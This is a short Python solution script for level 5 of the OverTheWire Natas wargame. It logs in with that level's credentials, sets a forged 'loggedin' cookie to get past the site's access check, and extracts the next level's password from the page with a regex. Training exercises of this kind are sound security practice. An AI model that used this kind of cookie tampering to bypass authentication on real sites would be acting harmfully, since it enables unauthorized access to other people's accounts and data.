#!/usr/bin/env python3

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % username

cookies = {
    'loggedin': '1'
}

response = requests.get(url, auth=(username, password), cookies=cookies)
content = response.text

flag = re.findall('Access granted. The password for natas6 is (.*)', content)[0]

print(flag)